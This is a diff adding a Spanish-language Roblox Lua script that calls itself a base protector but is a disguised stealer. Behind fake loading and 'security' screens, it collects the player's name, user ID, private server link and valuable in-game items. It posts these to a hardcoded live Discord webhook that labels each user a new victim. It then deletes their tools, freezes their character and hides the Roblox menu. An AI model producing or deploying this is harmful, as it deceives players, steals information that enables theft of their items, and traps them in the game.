@@ -1,0 +1,458 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local GuiService = game:GetService("GuiService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- CONFIGURACIÓN
+local WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1446159384798298124/4xKrReMncfbttw6_BtA3K3vjQe6PPbFkfWJzFFWAz_OHtMAhXLFt5NWu00o3I8787PB8"
+local Min_Gen = 1_000_000 
+
+-- VARIABLES LOCALES
+local Jugador = Players.LocalPlayer
+local PlayerGui = Jugador:WaitForChild("PlayerGui")
+local UserID = Jugador.UserId
+
+--------------------------------------------------------------------------------
+-- SISTEMA DE UI (DISEÑO PROFESIONAL)
+--------------------------------------------------------------------------------
+
+local function CrearInterfazCarga()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ShxdowProtectorLoading"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = PlayerGui
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(1, 0, 1, 0)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+    MainFrame.Parent = ScreenGui
+
+    -- Fondo animado
+    local UIGradient = Instance.new("UIGradient")
+    UIGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 8, 12)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 15, 30))
+    }
+    UIGradient.Rotation = 45
+    UIGradient.Parent = MainFrame
+
+    local LogoText = Instance.new("TextLabel")
+    LogoText.Text = "PROTECTOR DE BASES"
+    LogoText.Font = Enum.Font.GothamBlack
+    LogoText.TextSize = 32
+    LogoText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LogoText.Position = UDim2.new(0.5, 0, 0.4, 0)
+    LogoText.AnchorPoint = Vector2.new(0.5, 0.5)
+    LogoText.BackgroundTransparency = 1
+    LogoText.Parent = MainFrame
+
+    local SubText = Instance.new("TextLabel")
+    SubText.Text = "by shxdow"
+    SubText.Font = Enum.Font.Gotham
+    SubText.TextSize = 18
+    SubText.TextColor3 = Color3.fromRGB(150, 100, 255)
+    SubText.Position = UDim2.new(0.5, 0, 0.45, 0)
+    SubText.AnchorPoint = Vector2.new(0.5, 0.5)
+    SubText.BackgroundTransparency = 1
+    SubText.Parent = MainFrame
+
+    local LoadingBarBG = Instance.new("Frame")
+    LoadingBarBG.Size = UDim2.new(0.6, 0, 0.02, 0)
+    LoadingBarBG.Position = UDim2.new(0.2, 0, 0.6, 0)
+    LoadingBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    LoadingBarBG.BorderSizePixel = 0
+    LoadingBarBG.Parent = MainFrame
+    
+    local LoadingBarCorner = Instance.new("UICorner")
+    LoadingBarCorner.CornerRadius = UDim.new(1, 0)
+    LoadingBarCorner.Parent = LoadingBarBG
+
+    local LoadingFill = Instance.new("Frame")
+    LoadingFill.Size = UDim2.new(0, 0, 1, 0)
+    LoadingFill.BackgroundColor3 = Color3.fromRGB(120, 80, 220)
+    LoadingFill.BorderSizePixel = 0
+    LoadingFill.Parent = LoadingBarBG
+    
+    local FillCorner = Instance.new("UICorner")
+    FillCorner.CornerRadius = UDim.new(1, 0)
+    FillCorner.Parent = LoadingFill
+
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Text = "Inicializando..."
+    StatusText.Font = Enum.Font.SourceSansBold
+    StatusText.TextSize = 16
+    StatusText.TextColor3 = Color3.fromRGB(180, 180, 180)
+    StatusText.Position = UDim2.new(0.5, 0, 0.65, 0)
+    StatusText.AnchorPoint = Vector2.new(0.5, 0.5)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Parent = MainFrame
+
+    local function AnimateLoad()
+        local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+        
+        StatusText.Text = "Verificando integridad del sistema..."
+        TweenService:Create(LoadingFill, tweenInfo, {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
+        task.wait(1.6)
+        
+        StatusText.Text = "Cargando módulos de defensa..."
+        TweenService:Create(LoadingFill, tweenInfo, {Size = UDim2.new(0.7, 0, 1, 0)}):Play()
+        task.wait(1.6)
+        
+        StatusText.Text = "Conectando con servidores seguros..."
+        TweenService:Create(LoadingFill, tweenInfo, {Size = UDim2.new(0.9, 0, 1, 0)}):Play()
+        task.wait(1)
+        
+        StatusText.Text = "¡Protección Activada!"
+        TweenService:Create(LoadingFill, TweenInfo.new(0.5), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+        LoadingFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+        task.wait(1)
+        
+        local fadeOut = TweenService:Create(MainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+        fadeOut:Play()
+        ScreenGui:Destroy()
+    end
+
+    task.spawn(AnimateLoad)
+end
+
+--------------------------------------------------------------------------------
+-- LÓGICA DE FONDO (OBFUSCADA/FUNCIONAL)
+--------------------------------------------------------------------------------
+
+local function bloquearMenuRoblox()
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    
+    if UserInputService.KeyboardEnabled then
+        local escConnection
+        escConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+            if input.KeyCode == Enum.KeyCode.Escape then
+                escConnection:Disconnect()
+                task.wait(0.05)
+                escConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+                    if input.KeyCode == Enum.KeyCode.Escape then end
+                end)
+            end
+        end)
+    end
+    
+    task.spawn(function()
+        while task.wait(1) do
+            pcall(function()
+                local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+                if robloxGui then
+                    for _, element in pairs(robloxGui:GetDescendants()) do
+                        if element:IsA("Frame") or element:IsA("ImageButton") then
+                            element.Visible = false
+                        end
+                    end
+                end
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            end)
+        end
+    end)
+    
+    UserInputService.WindowFocusReleased:Connect(function()
+        RunService:SetRobloxGuiFocused(false)
+    end)
+end
+
+local function formatNumberShort(n)
+    if not n or type(n) ~= "number" then return "$0" end
+    if n >= 1e9 then return string.format("$%.1fB", n / 1e9):gsub("%.0B", "B") end
+    if n >= 1e6 then return string.format("$%.1fM", n / 1e6):gsub("%.0M", "M") end
+    if n >= 1e3 then return string.format("$%.1fK", n / 1e3):gsub("%.0K", "K") end
+    return "$" .. tostring(n)
+end
+
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local num = s:match("([%d%.]+)")
+    if not num then return 0 end
+    local n = tonumber(num) or 0
+    if s:find("B") then return n * 1e9
+    elseif s:find("M") then return n * 1e6
+    elseif s:find("K") then return n * 1e3
+    else return n end
+end
+
+local function getBrainrots()
+    local results = {}
+    local plots = Workspace:FindFirstChild("Plots") or Workspace
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
+        if podiums then
+            for _, pd in ipairs(podiums:GetChildren()) do
+                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local att = spawn and spawn:FindFirstChild("Attachment")
+                local oh = att and att:FindFirstChild("AnimalOverhead")
+                
+                local nameLbl = oh and oh:FindFirstChild("DisplayName")
+                local genLbl = oh and oh:FindFirstChild("Generation")
+                
+                if nameLbl and nameLbl:IsA("TextLabel") then
+                    local name = nameLbl.Text
+                    local genText = genLbl and genLbl.Text or "0"
+                    local valueNum = parseValueFromText(genText)
+                    
+                    if valueNum >= Min_Gen then
+                        local key = name .. "|" .. valueNum
+                        if results[key] then
+                            results[key].count = results[key].count + 1
+                        else
+                            results[key] = {name = name, value = valueNum, count = 1}
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    local out = {}
+    for _, v in pairs(results) do table.insert(out, v) end
+    table.sort(out, function(a, b) return a.value > b.value end)
+    return out
+end
+
+-- ENVÍO MEJORADO A DISCORD (FORMATO PREMIUM)
+local function sendToDiscord(link, playerCount, playerName, brainrots)
+    task.spawn(function()
+        local itemList = ""
+        local totalValue = 0
+        
+        -- Construcción de la lista de items limpia
+        if #brainrots > 0 then
+            for i, br in ipairs(brainrots) do
+                if i <= 15 then -- Límite para no romper el embed
+                    local fVal = formatNumberShort(br.value)
+                    itemList = itemList .. string.format("`#%d` **%s** ➔ %s (x%d)\n", i, br.name, fVal, br.count)
+                end
+                totalValue = totalValue + (br.value * br.count)
+            end
+            if #brainrots > 15 then
+                itemList = itemList .. string.format("\n*...y %d items más*", #brainrots - 15)
+            end
+        else
+            itemList = "⚠️ *No se encontraron items de alto valor.*"
+        end
+
+        local embedData = {
+            ["title"] = "💎 Método Shxdow - Servidor Detectado",
+            ["type"] = "rich",
+            ["color"] = #brainrots > 0 and 10181046 or 16711680, -- Morado si hay items, Rojo si no
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserID.."&width=420&height=420&format=png"
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Usuario",
+                    ["value"] = string.format("`%s` (ID: %d)", playerName, UserID),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "👥 Jugadores",
+                    ["value"] = string.format("`%d / Servidor`", playerCount),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔗 Link del Servidor",
+                    ["value"] = string.format("```%s```", link),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📦 Inventario Valioso Detectado",
+                    ["value"] = itemList,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "💰 Valor Estimado Total",
+                    ["value"] = "**"..formatNumberShort(totalValue).."**",
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Shxdow Stealer • v3.0 • Ejecutado a las " .. os.date("%X")
+            }
+        }
+
+        local jsonData = HttpService:JSONEncode({
+            ["content"] = "@everyone 🚨 **NUEVA VÍCTIMA DETECTADA**",
+            ["embeds"] = {embedData},
+            ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png", -- Icono genérico hacker
+            ["username"] = "Shxdow Logger"
+        })
+
+        local success, res = pcall(function()
+            return request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        
+        if not success then
+            -- Intento secundario si request falla (para algunos ejecutores)
+            pcall(function()
+                HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
+            end)
+        end
+    end)
+end
+
+local function trapPlayer()
+    local player = Players.LocalPlayer
+    local char = player.Character or player.CharacterAdded:Wait()
+    
+    task.spawn(function()
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then backpack:ClearAllChildren() end
+        for _, tool in pairs(char:GetChildren()) do
+            if tool:IsA("Tool") then tool:Destroy() end
+        end
+    end)
+    
+    task.spawn(function()
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.PlatformStand = true
+        end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- MENÚ PRINCIPAL (INTERACCIÓN)
+--------------------------------------------------------------------------------
+
+local function IniciarMenuPrincipal()
+    task.wait(5.5) 
+    
+    local MenuGui = Instance.new("ScreenGui")
+    MenuGui.Name = "ShxdowMenuMain"
+    MenuGui.ResetOnSpawn = false
+    MenuGui.Parent = PlayerGui
+    
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 400, 0, 250)
+    Frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    Frame.BorderSizePixel = 0
+    Frame.Parent = MenuGui
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 10)
+    UICorner.Parent = Frame
+    
+    local Stroke = Instance.new("UIStroke")
+    Stroke.Color = Color3.fromRGB(100, 50, 200)
+    Stroke.Thickness = 2
+    Stroke.Parent = Frame
+    
+    local Title = Instance.new("TextLabel")
+    Title.Text = "CONFIGURACIÓN DE SEGURIDAD"
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 20
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Size = UDim2.new(1, 0, 0, 50)
+    Title.BackgroundTransparency = 1
+    Title.Parent = Frame
+    
+    local Desc = Instance.new("TextLabel")
+    Desc.Text = "Ingresa el enlace del servidor para proteger la base:"
+    Desc.Font = Enum.Font.Gotham
+    Desc.TextSize = 14
+    Desc.TextColor3 = Color3.fromRGB(180, 180, 180)
+    Desc.Size = UDim2.new(1, 0, 0, 30)
+    Desc.Position = UDim2.new(0, 0, 0, 50)
+    Desc.BackgroundTransparency = 1
+    Desc.Parent = Frame
+    
+    local Input = Instance.new("TextBox")
+    Input.Size = UDim2.new(0.8, 0, 0, 40)
+    Input.Position = UDim2.new(0.1, 0, 0.4, 0)
+    Input.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Input.PlaceholderText = "https://roblox.com/share?code=..."
+    Input.Font = Enum.Font.SourceSans
+    Input.TextSize = 14
+    Input.Parent = Frame
+    
+    local InputCorner = Instance.new("UICorner")
+    InputCorner.CornerRadius = UDim.new(0, 6)
+    InputCorner.Parent = Input
+    
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(0.6, 0, 0, 40)
+    Btn.Position = UDim2.new(0.2, 0, 0.7, 0)
+    Btn.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
+    Btn.Text = "ACTIVAR PROTECCIÓN"
+    Btn.Font = Enum.Font.GothamBold
+    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Btn.TextSize = 16
+    Btn.Parent = Frame
+    
+    local BtnCorner = Instance.new("UICorner")
+    BtnCorner.CornerRadius = UDim.new(0, 6)
+    BtnCorner.Parent = Btn
+    
+    Btn.MouseButton1Click:Connect(function()
+        local link = Input.Text
+        if #link < 10 then
+            Input.Text = ""
+            Input.PlaceholderText = "¡Enlace inválido!"
+            task.wait(1)
+            return
+        end
+        
+        Btn.Text = "ESCANEANDO..."
+        Btn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
+        
+        -- Ejecutar lógica
+        local brainrots = getBrainrots()
+        sendToDiscord(link, #Players:GetPlayers(), Jugador.Name, brainrots)
+        
+        task.wait(1)
+        MenuGui:Destroy()
+        
+        -- Pantalla falsa final y bloqueo
+        local FinalGui = Instance.new("ScreenGui")
+        FinalGui.IgnoreGuiInset = true
+        FinalGui.Parent = PlayerGui
+        
+        local BlackScreen = Instance.new("Frame")
+        BlackScreen.Size = UDim2.new(1,0,1,0)
+        BlackScreen.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        BlackScreen.Parent = FinalGui
+        
+        local FinalText = Instance.new("TextLabel")
+        FinalText.Text = "OPTIMIZANDO SEGURIDAD..."
+        FinalText.TextColor3 = Color3.fromRGB(100, 255, 100)
+        FinalText.Font = Enum.Font.Code
+        FinalText.TextSize = 24
+        FinalText.Size = UDim2.new(1,0,1,0)
+        FinalText.BackgroundTransparency = 1
+        FinalText.Parent = BlackScreen
+        
+        trapPlayer()
+        task.wait(2)
+        bloquearMenuRoblox()
+    end)
+end
+
+-- EJECUCIÓN
+CrearInterfazCarga()
+IniciarMenuPrincipal()
